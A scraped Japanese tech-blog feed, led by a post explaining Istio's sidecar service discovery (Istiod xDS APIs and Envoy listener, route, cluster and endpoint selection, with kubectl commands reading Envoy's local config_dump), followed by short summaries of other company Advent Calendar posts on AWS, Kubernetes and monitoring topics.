サービスディスカバリーのパターンサービスディスカバリーのパターンとはサービスディスカバリーの仕組みにはいくつか種類があります。Istioのサービスディスカバリーは、このうちのサーバーサイドパターンを実装したものになります。サーバーサイドパターン送信元マイクロサービスから、問い合わせとロードバランシングの責務が切り離されています。送信元マイクロサービスは、ロードバランサーにリクエストを送信します。ロードバランサーは、宛先マイクロサービスの宛先をサービスレジストリに問い合わせ、またリクエストをロードバランシングする責務を担っています\uD83D\uDCAA\uD83C\uDFFB(例) Istio、Linkerd、などCloud Native Patterns: Designing change-tolerant software (English Edition)Server-side service discovery patternクライアントサイドパターン通信の送信元マイクロサービスは、宛先マイクロサービスの宛先をサービスレジストリに問い合わせ、さらにロードバランシングする責務を担います。(例) NetflixのEureka、などCloud Native Patterns: Designing change-tolerant software (English Edition)Client-side service discovery patternService Discovery in Kubernetes: Combining the Best of Two Worlds03. Istioのサービスディスカバリーの仕組みIstioが実装するサービスメッシュには、サイドカープロキシメッシュとアンビエントメッシュがあり、今回はサイドカープロキシメッシュのサービスディスカバリーを取り上げます。Istioのサービスディスカバリーは、discoveryコンテナとistio-proxyコンテナが軸となり、サーバーサイドパターンのサービスディスカバリーを実装します。全体像(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47istio-proxyコンテナは、サービスレジストリへの問い合わせと、ロードバランシングする責務を担っていることに注目してください。(1) kube-apiserverによる宛先情報保管kube-apiserverは、Pod等の宛先情報をetcd等に保管します。これは、Kubernetesの通常の仕組みです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナは、kube-apiserverからPod等の宛先情報を取得し、自身に保管します。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナは、discoveryコンテナからPod等の宛先情報を双方向ストリーミングRPCで取得します。(4) istio-proxyコンテナによるリクエスト受信送信元マイクロサービスがリクエストを送信します。サーバーサイドパターンでの責務通り、送信元マイクロサービスはロードバランサー (ここではistio-proxyコンテナ) にリクエストを送信します。この時、送信元マイクロサービスがistio-proxyコンテナに直接的にリクエストを送信しているというよりは、iptablesがistio-proxyコンテナにリクエストをリダイレクトします。istio-proxyコンテナこれを受信します。(5) istio-proxyコンテナによるロードバランシングistio-proxyコンテナは、リクエストをロードバランシングし、また宛先Podに送信します。Istio in ActionJimmy Song\'s Cloud Native BlogTech-赵化冰的博客 | Zhaohuabing Blogdiscoveryコンテナの仕組み全体像の中から、discoveryコンテナを詳しく見てみましょう。discoveryコンテナは、別名Istiodと呼ばれています。XDS-APIというエンドポイントを公開しており、XDS-APIのうち、サービスディスカバリーに関係するAPIは以下の通りです。今回は詳しく言及しませんが、istio-proxyコンテナがHTTPSリクエストを処理するために、証明書を配布するためのSDS-APIもあります。 APIの種類  説明                                                   LDS-API    Envoyのリスナーを取得できる。                          RDS-API    Envoyのルートを取得できる。                            CDS-API    Envoyのクラスターを取得できる。                        EDS-API    Envoyのエンドポイントできる。                          ADS-API    各XDS-APIから取得できる宛先情報を整理して取得できる。 Istio in Action(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得XDS-APIとistio-proxyコンテナの間では、gRPCの双方向ストリーミングRPCの接続が確立されています。そのため、istio-proxyコンテナからのリクエストに応じて宛先情報を返却するだけでなく、リクエストがなくとも、XDS-APIからもistio-proxyコンテナに対して宛先情報を送信します。XDS-APIのエンドポイントがいくつかあり、各エンドポイントから宛先情報を取得できます。一方で、各エンドポイントからバラバラに宛先情報を取得すると、Envoy上でこれを整理する時に、宛先情報のバージョンの不整合が起こる可能性があります。そのため、Istioは実際にはADS-APIを使用して宛先情報を取得します。istio-proxyコンテナの仕組み全体像の中から、istio-proxyコンテナを詳しく見てみましょう。Istio in ActionJimmy Song\'s Cloud Native BlogTech-赵化冰的博客 | Zhaohuabing Blog(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナでは、pilot-agentとEnvoyが稼働しています。先ほどistio-proxyコンテナは、双方向ストリーミングRPCでADS-APIから宛先情報を取得すると説明しました。厳密にはEnvoyが、pilot-agentを介して、ADS-APIから双方向ストリーミングRPCで宛先情報を取得します。(4) istio-proxyコンテナによるリクエスト受信istio-proxyコンテナによるリクエスト受信 と同じです。(5) istio-proxyコンテナによるリクエスト受信EnvoyはADS-APIから取得した宛先情報に基づいて、宛先マイクロサービスのインスタンスにロードバランシングします。04. istio-proxyコンテナ内のEnvoyの仕組み全体像EnvoyがADS-APIから取得した宛先情報を見ていく前に、Envoyの処理の流れを解説します。istio-proxyコンテナ内のEnvoyでは、以下の仕組みでHTTPリクエストを処理します。(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47Istio in Action (English Edition)Istio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and ObserveArchitecture Analysis of Istio: The Most Popular Service Mesh Project - Alibaba Cloud Community(1) 送信元マイクロサービスからリクエスト受信istio-proxyコンテナは、送信元マイクロサービスからリクエストを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先情報 (例：宛先IPアドレス、ポート番号、パス、ホスト、など) に応じてリスナーを選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくルートを選びます。▶ TCPリクエストを処理する場合についてエストを処理する場合、リスナーに紐づくのはルートですが、TCPリクエストの場合はそうではありません。TCPリクエストを処理する場合、リスナーにクラスターが紐づきます\uD83D\uDC4D\uD83C\uDFFBDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPT(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくクラスターを選びます。(5) Envoyによるエンドポイント選択Envoyは、クラスターに紐づくエンドポイントを選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントに対応するインスタンスにリクエストを送信します。Envoyで確認した宛先情報を\uD83D\uDC46に当てはめて見ていくことにしましょう。EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイント実際にEnvoyに登録されている宛先情報は、istio-proxyコンテナ自体のlocalhost:15000/config_dumpからJSON形式で取得できます。もしお手元にIstioがある場合は、Envoyにどんな宛先情報が登録されているか、Envoyを冒険してみてください。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump\\" | yq -P▶ 宛先情報を見やすくするyqコマンドについてJSON形式で設定を出力します。JSONだと見にくいため、yqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dリスナー▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_listeners}から確認できます。ここでは、foo-pod内でbar-podのリスナーを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -P▼ 結果以下を確認できました。宛先IPアドレスや宛先ポート番号に応じてリスナーを選べるようになっており、ここでは<任意のIPアドレス>:50002。リスナーに紐づくルートの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener    # リスナー名    name: 0.0.0.0_50002    active_state:      version_info: 2022-11-24T12:13:05Z/468      listener:        \\"@type\\": type.googleapis.com/envoy.config.listener.v3.Listener        name: 0.0.0.0_50002        address:          socket_address:            # 受信したパケットのうちで、宛先IPアドレスでフィルタリング            address: 0.0.0.0            # 受信したパケットのうちで、宛先ポート番号でフィルタリング            port_value: 50002        filter_chains:          - filter_chain_match:              transport_protocol: raw_buffer              application_protocols:                - http/1.1                - h2c            filters:              - name: envoy.filters.network.http_connection_manager                typed_config:                  \\"@type\\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager                  stat_prefix: outbound_0.0.0.0_50001                  rds:                    config_source:                      ads: {}                      initial_fetch_timeout: 0s                      resource_api_version: V3                    # 本リスナーに紐づくルートの名前                    route_config_name: 50002  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener  ...Administration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentationルート▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_route_configs}から確認できます。ここでは、foo-pod内でbar-podのルートを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。リスナーを取得した時に確認できたルートの名前リクエストのパスやHostヘッダーに応じてルートを選べるようになっているルートに紐づくクラスターの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig    version_info: 2022-11-24T12:13:05Z/468    route_config:      \\"@type\\": type.googleapis.com/envoy.config.route.v3.RouteConfiguration      # ルートの名前      name: 50002      virtual_hosts:        - name: bar-service.bar-namespace.svc.cluster.local:50002          # ホストベースルーティング          domains:            - bar-service.bar-namespace.svc.cluster.local            - bar-service.bar-namespace.svc.cluster.local:50002            - bar-service            - bar-service:50002            - bar-service.bar-namespace.svc            - bar-service.bar-namespace.svc:50002            - bar-service.bar-namespace            - bar-service.bar-namespace:50002            - 172.16.0.2            - 172.16.0.2:50002          routes:            - match:                # パスベースルーティング                prefix: /              route:                # 本ルートに紐づくクラスターの名前                cluster: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local                timeout: 0s                retry_policy:                  retry_on: connect-failure,refused-stream,unavailable,cancelled,retriable-status-codes                  num_retries: 2                  retry_host_predicate:                    - name: envoy.retry_host_predicates.previous_hosts                  host_selection_retry_max_attempts: \\"5\\"                  retriable_status_codes:                    - 503                max_stream_duration:                  max_stream_duration: 0s                  grpc_timeout_header_max: 0s              decorator:                operation: bar-service.bar-namespace.svc.cluster.local:50002/*  ...  - \'@type\': type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig  ...Administration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentationクラスター▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?resource={dynamic_active_clusters}から確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。ルートを取得した時に確認できたクラスターの名前クラスターに紐づくエンドポイントの親名configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster    version_info: 2022-11-24T12:13:05Z/468    cluster:      \\"@type\\": type.googleapis.com/envoy.config.cluster.v3.Cluster      # クラスターの名前      name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local      type: EDS      eds_cluster_config:        eds_config:          ads: {}          initial_fetch_timeout: 0s          resource_api_version: V3        # 本クラスターに紐づくエンドポイントの親名        service_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster  ...Administration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentationエンドポイント▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?include_edsから確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。クラスターを取得した時に確認できたエンドポイントの親名bar-podのインスタンスが3個あるため、3個のエンドポイントがありますconfigs:  dynamic_endpoint_configs:    - endpoint_config:        \\"@type\\": type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment        # エンドポイントの親名        cluster_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local        endpoints:          - locality:              region: ap-northeast-1              zone: ap-northeast-1a            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.1                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.2                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.3                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1        policy:          overprovisioning_factor: 140    ...    - endpoint_config:    ...Administration interface — envoy 1.29.0-dev-783ce8 documentationConfigDump (proto) — envoy 1.29.0-dev-783ce8 documentation▶ Envoyの負荷分散方式についてload_balancing_weightキー値が等しい場合、EnvoyはP2Cアルゴリズムに基づいてロードバランシングします\uD83D\uDC4DEnvoyの処理の流れのまとめ確認できた宛先情報を、Envoyの処理の流れに当てはめてみました。(1) 送信元マイクロサービスからリクエスト受信送信元マイクロサービスは、宛先マイクロサービス (<任意のIP>/:50002) にリクエストを送信します。サイドカーコンテナのistio-proxyコンテナはこれを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先 (IPアドレス、ポート番号、パス) からPodのリスナー (0.0.0.0_50002) を選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくPodのルート (50002) を選びます。(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのクラスター (outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local) を選びます。(5) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのインスタンスのエンドポイント (11.0.0.X/:50002) を選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントの宛先にPodのリクエストを送信します。サービスディスカバリーの冒険は以上です⛵05. おわりにIstioの機能の1つである『サービスディスカバリー』の仕組みを、Envoyを交えながらもりもり布教しました。愛が溢れてしまいました。Istioの機能を1つとっても、複雑な仕組みで実現していることがお分かりいただけたかと思います。Istioありがとう\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F謝辞3-shake SRE Tech Talk での発表前後に、以下の方々に発表内容について助言をいただきました。@ido_kara_deru さん@yosshi_ さん@yteraoka さん(アルファベット順)また、今回の 3-shake Advent Calender 2022 は、以下の方々に企画いただきました。@jigyakkuma_ さん@nwiizo さん(アルファベット順)皆様に感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/25/060000","isoDate":"2022-12-24T21:00:00.000Z","dateMiliSeconds":1671915600000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"Steam Deck に Windows を入れたい方の参考になれば...!","contentSnippet":"この記事は 3-shake Advent Calendar 2022 の24日目の記事です。はじめに年末、しかもクリスマスということで散財させていただきました。初めまして、戸澤といいます。日常…","link":"https://qiita.com/tozastation/items/a57df36a369b5425795a","isoDate":"2022-12-24T08:36:33.000Z","dateMiliSeconds":1671870993000,"authorName":"tozastation","authorId":"tozastation"},{"title":"KubernetesのマニフェストをCIで検査する方針を考える","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 17日目の記事です。https://qiita.com/advent-calendar/2022/3-shake 概要以下の気持ちでKubernetesのマニフェストを検査するツールを選定しました。ベストプラクティスに則りたい細かなレビューの手間を省きたいセキュリティリスクを排除したい保守するのが大変なので出来るだけ自分でポリシーは書きたくない。書くとしても書きやすい方法で記述したい 検査ツールの選定以下のツールからカテゴリ別に選定することにしました。スキーマ検査kubeval...","link":"https://zenn.dev/tayusa/articles/ad9fafa197888b","isoDate":"2022-12-17T03:48:50.000Z","dateMiliSeconds":1671248930000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"CloudWatch Logs のログストリームごとのサイズを取得する","contentSnippet":"動機Amazon CloudWatch Logs のログストリームごとのサイズを知りたいことがありました。たとえば Amazon EKS クラスタを立ち上げて Fluentd または Fluent Bit でログを CloudWatch Logs に送る設定をすると，Pod のログは単一のロググループ（デフォルトでは /aws/containerinsights/Cluster_Name/application）に集約されます。https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Container-Ins...","link":"https://zenn.dev/toshikish/articles/684e4d7ed4532f","isoDate":"2022-12-16T08:57:33.000Z","dateMiliSeconds":1671181053000,"authorName":"toshikish","authorId":"toshikish"},{"title":"エンジニア市場拡大のための「憧れの職業」の重要性に関する緒論","contentSnippet":"はじめに今回、4年ぶりにQiitaに記事を投稿させていただく。ひょんなきっかけ^1で私は、自身が勤めるスリーシェイクのアドベントカレンダーである3-shake Advent Calendar 2…","link":"https://qiita.com/skikkh/items/21c270c7ff7a942dc5f7","isoDate":"2022-12-16T02:21:05.000Z","dateMiliSeconds":1671157265000,"authorName":"skikkh","authorId":"skikkh"},{"title":"Descheduler for Kubernetes で Pod の再配置","contentSnippet":"背景 ある案件で以下のような小規模な Kubernetes クラスタを運用していました。 Kubernetes には hoge というアプリケーションをデプロイしている hoge アプリケーションを乗せる用のノードは2ノ […]The post Descheduler for Kubernetes で Pod の再配置 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/kubernetes-descheduler/","isoDate":"2022-12-13T00:46:47.000Z","dateMiliSeconds":1670892407000,"authorName":"Sreake","authorId":"Sreake"},{"title":"時間がない人のための AWS Solutions Architect - Professional 勉強法","contentSnippet":"難度が高くしっかりとした準備が必要な AWS SA Pro 試験を申し込んだものの，残された時間があまりないという方向けに書いた勉強法の記事です。 試験の概略 特徴長文の選択式問題が75問出題され，それを180分で解くという長丁場な試験です。ざっくり1問あたり2分24秒かけられます。75問もあり，1問に複数のサービスを関連させられるので，AWS が重点的に問いたいサービス・テーマはもれなく出現します。AWS を使った2年以上の実務経験が想定されていますが，たいていの場合，実務で扱うサービスは主要なサービスに限られ，触ったこともないサービスが多く出題されます。そのため，確...","link":"https://zenn.dev/toshikish/articles/06d85a2db79f4d","isoDate":"2022-12-12T10:46:25.000Z","dateMiliSeconds":1670841985000,"authorName":"toshikish","authorId":"toshikish"},{"title":"AWS Control Towerを調べる","contentSnippet":"これは  3-shake Advent Calendar 2022 10日目の記事です仕事の中でAWSで複数のアカウントを管理したいという要件あり、その中でAWS Control Towerが使えないかなと調べたものをざっくりと書いていきます。AWS Control TowerとはAWS Control TowerとはLanding Zoneを実装するためのAWSのマネージドサービスです。そもそもLanding Zoneって何って話になりますね。Landing Zoneとはセキュリティとコンプライアンスのベストプラクティスに基づきアーキテクチャ設計とマルチアカウント環境を管理する仕組みを指します。Landing Zoneは、下記機能から構成されます。アカウントの発行必要な初期設定の済んだアカウントを作成管理用権限の発行対象アカウントを管理するための権限を作成AWS ログの集約監査用ログをセキュアに一元保存ガードレールの設置実施してはいけない操作の禁止危険な設定の監視Landing Zoneの実装方法AWS Control TowerAWSサービスとして提供される Landing Zoneです。容易に利用可能ですが、カスタマイズするには制限があります。(必須のガードレールを外せなかったり)主にこれからAWSを利用する場合に利用できます。既存アカウントにも適用可能です。独自実装の Landing Zone自組織で独自実装するパターンです。自組織の方針に従って自由にカスタマイズできるのが強みです。ただし、自由にカスタマイズはできますが、自身でメンテナンスしないといけないので、コストはかかります。主に既存アカウントに適用する場合に利用できます。自組織でアカウント発行の仕組みや管理の仕組みができあがってる場合などです。そもそもなんでマルチアカウントにするのかAWSをマルチアカウントにする観点として以下のものが考えられます。環境の分離開発、テスト、本番を分離することによるセキュリティおよび統制の確保請求の分離部門やシステム単位でのコスト明確化権限の分離部門間での権限分離およびアカウントへの権限移譲複雑性の分離アカウントの目的を明確に絞ることで、構成がシンプルになるAWS Organizationsだけでもできることマルチアカウント管理するだけならOrganizationだけでもある程度はできます。むしろAWS Control TowerはOrganizationの機能を利用しています。複数AWSアカウントの一元管理Organization Unit(OU)の作成複数アカウントのグルーピング化AWSアカウントの発行Service Control Policyの作成、OUへの適用複数アカウントの一括請求AWS Control Towerだと何ができるのかControl Towerで提供される機能として以下のものがあります。Landing Zoneの提供AWS Organizationを使用してマルチアカウントを作成デフォルトでSandbox、SecurityのOUを作成AWS IAM アイデンティティセンターを利用したID管理を提供Account FactoryAWSアカウントのプロビジョニングの自動化設定可能なテンプレートを提供CloudTrailとConfigログの保存Log Archiveアカウント内のS3バケットに一元的に保存されるガードレールの提供必須と任意の観点の2種類と予防的と発見的の2種類の組み合わせがありControl Towerにより管理下のアカウントに適用される参考: ガードレールの仕組み予防的ガードレール(Service Control Policy)禁止されたアクションの実行が拒否される仕組みControl Tower管理下のアカウントは必須の予防的ガードレールで禁止されているアクションが不可能発見的ガードレール(Config)特定のイベントが発生したときにCloudTrailに記録される仕組みダッシュボードOUやアカウント、ガードレール違反などが一覧表示できるAWS Control TowerではできないことAWS Control Towerでは提供されてない機能もあります。GuardDutyやSecurity Hubなどのセキュリティ機能を組織全体適用するにはOrganizationsの機能を利用する必要があります。AWS Control Towerの注意点、制約事項いろいろ資料を見てみてこの辺注意が必要かなという点を書いていきます。注意点既存アカウントの Control Tower への受入処理時にエラーになった場合、スタックセット内で自動実行される作業の一部手作業が必要になる参考:トラブルシューティング - AWS Control Tower独自ガードレールの追加は可能だが、容易ではない。必須ガードレールを外せない参考:必須のガードレール - AWS Control Tower各種セキュリティー機能は自動で有効化されないため、Control Towerの範囲外のセキュリティ機能は Control Tower の機能の外で管理が必要になる範囲内の機能: Config, CloudTrail, SCP範囲外の機能: GuardDuty, Security Hub, IAM Access Analyzer, DetectiveControl Tower 未対応リージョンを使用している場合、Control Tower適用リージョンと適用外リージョンが混在して管理が煩雑になる大阪リージョン未対応なのでマルチリージョンを考えるときに注意Control Towerはマネージドサービスであるが追加機能によっては手動バージョンアップ が必要になるケースがある参考: ランディングゾーンを更新する - AWS Control Tower参考: 更新について - AWS Control Towerログアーカイブアカウントで独自のログバケットを作成可能だが、非推奨参考: ランディングゾーンのセットアップに関する管理上のヒントリージョンの使用を制限する SCP の併用に注意が必要参考: AWS Control Tower リソースの作成および変更に関するガイダンスIaC との境界の検討が必要アカウント発行に関してはControl Tower(Account Factory)で手動で行い、その後のアカウント設定はTerraformで行うなどAccount Factory for Terraformを利用することでAWSアカウント発行は可能参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニングどこまでTerraformで対応するかは別途検討が必要制限とクォータS３へのログの保存期間は、最大15年間保存可能(最近アップデートされた)Security OU の共有アカウントの E メールアドレスは変更可能だが、これらの変更を AWS Control Tower コンソールで確認するには、Landing Zone を更新する必要があるAWS Control Tower Landing zone の OU には、OU あたり5個のSCPの制限が適用される300超のアカウントを持つ既存の OU は、AWS Control Tower に登録することはできない300を超える場合はOUを分ける必要があるOUのネストは２段階まで、孫OUを持つことはできない参考: AWS Organizations における組織単位のベストプラクティスAWS Control Towerを使うべきなのかマルチアカウントを展開していくのであれば、AWSのベストプラクティスに乗れるので、使用するのが無難です。ただし、独自のLanding Zoneをすでに構築しており、Account Factoryの仕組みも独自で構築できているのであれば、移行コストを鑑みてそのままでも問題ないです。必須の予防的ガードレールが許容できない、OUなどの制限にひっかるなどの運用上の制約がある場合は使えないので、組織のポリシーを見直すか、独自でLanding Zoneを作るかを考える必要があります。発展もっと調査したかったが、時間が足りなかったことや今後調べたいことです。コンソールからAccount Factory実行するとService Catalogの設定項目がありますが、Service Catalog自体の理解不足でどう扱うのかが把握できてないのでこの辺調べたいです。Account Factory for Terraform(AFT)を使うとアカウント発行そのものもIaC化できるので試したい。参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニング参考: ついにControl Towerのアカウント発行からカスタマイズまでIaC対応！Account Factory for Terraform (AFT)が新登場 #reinvent | DevelopersIOCustomization for Control Tower(CfCT)を使うとアカウント発行のイベントをトリガーにCloudFormationを実行できるので、これも実験したい。参考: AWS Control Tower のカスタマイズ (CfCT) の概要 - AWS Control Tower参考: Control Towerカスタマイズソリューション(CfCT)を使ってガードレールとCloudFormationを自動展開してみた | DevelopersIOまとめControl Towerについて調べたことを書いていきました。実運用自体はまだしてないので、これから触ってみて知見が溜まってきたらまたそれも共有できたらと思います。","link":"https://blog.masasuzu.net/entry/2022/12/10/204957","isoDate":"2022-12-10T11:49:57.000Z","dateMiliSeconds":1670672997000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Site Reliability Engineering","contentSnippet":"これは 3-shake Advent Calendar 2022 9日目の蝉です。ポエムです。組織の Advent Calendar ですが、組織としての意見ではありません。早く SRE って3…","link":"https://qiita.com/yteraoka/items/561276f67ad4571ff9f3","isoDate":"2022-12-09T09:28:06.000Z","dateMiliSeconds":1670578086000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"速習 Datadog APM","contentSnippet":"Datadog APM を使った監視設計をすることがあり、使い勝手が良かったため基本的な部分と設定した方がいいなと思っている事項を書いていきます。 プロファイリング機能は使いませんでしたので、本記事では対象外です。 AP […]The post 速習 Datadog APM first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog-apm/","isoDate":"2022-12-08T04:33:11.000Z","dateMiliSeconds":1670473991000,"authorName":"Sreake","authorId":"Sreake"},{"title":"インシデント対応しながら書くポストモーテム","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 8日目の記事です。サービスにおいてインシデントが発生した場合に書くポストモーテムについて，書く負担を減らせるようなテンプレートを提案します。 ポストモーテムのテンプレートポストモーテムのテンプレートは，例えば以下のようなものが公開されています。 Google SREhttps://sre.google/sre-book/example-postmortem/タイトル・インシデント ID日付対応者ステータス概要影響主な原因障害発生のトリガー解決策検知アクションアイテム...","link":"https://zenn.dev/toshikish/articles/1d5bcf9ed1939d","isoDate":"2022-12-07T22:00:00.000Z","dateMiliSeconds":1670450400000,"authorName":"toshikish","authorId":"toshikish"},{"title":"lego で既存の秘密鍵を使って証明書を発行する","contentSnippet":"既存の秘密鍵を使って証明書を発行しなければいけないという特殊な環境ですぐに証明書を発行したいということがありました。 lego を使っての証明書発行はとても簡単ですが、デ","link":"https://blog.1q77.com/2022/12/issue-the-certificate-using-existing-private-key-with-lego/","isoDate":"2022-12-07T13:42:05.000Z","dateMiliSeconds":1670420525000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"セキュア・バイ・デザインの鳴くところ","contentSnippet":"セキュア・バイ・デザインの鳴くところ\\r安全なソフトウェアを全体から考えるみるで候\\r\\rOWASP Fukuoka Meeting #9\\rhttps://owasp-kyushu.connpass.com/event/266585/\\r\\r副読ブログ\\rhttps://syu-m-5151.hatenablog.com/entry/2022/12/07/204400","link":"https://speakerdeck.com/nwiizo/sekiyuabaidezainnoming-kutokoro","isoDate":"2022-12-07T05:00:00.000Z","dateMiliSeconds":1670389200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"社会に蔓延る労苦〈Toil〉をなくす（株式会社スリーシェイク入社エントリ）","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 5日目の記事です。前日は @aqarium さんによる 徒然なるままにDatadog APM でした。私は株式会社スリ…","link":"https://qiita.com/tayakun/items/2f5ca30b777a54b2c52d","isoDate":"2022-12-05T14:18:53.000Z","dateMiliSeconds":1670249933000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Prometheus で探索対象の ServiceMonitor を広げる","contentSnippet":"Kubernetes クラスタで Prometheus を導入し，ServiceMonitor を作って監視対象を定義したところ，一向に Target として追加されないことがありました。ServiceMonitor が作られているだけでは不十分で，Prometheus の探索する対象に入っている必要があります。それがどこで定義されているかを調べました。以下のような ServiceMonitor を考えます。apiVersion: monitoring.coreos.com/v1kind: ServiceMonitormetadata:  name: example-serv...","link":"https://zenn.dev/toshikish/articles/70424038397d6d","isoDate":"2022-12-05T09:53:34.000Z","dateMiliSeconds":1670234014000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Cloud Runで定期ジョブを実行する","contentSnippet":"本記事は GCP(Google Cloud Platform) Advent Calendar 2022 の4日目のものです。3日目は @po3rin さんのAPI on GKE に高速で認証をつけるIdentity-Aware Proxy \xd7 Identity Platform でした。 概要普段、GCPを使ったWebアプリケーション開発をしていますが、その中で、定期的に(スケジューリングをして)、ジョブを実行するということがあります。例えば、DBのデータの整合性とか、ログの収集とか。。。この要件のときは、GCP内で完結させるとして、Cloud 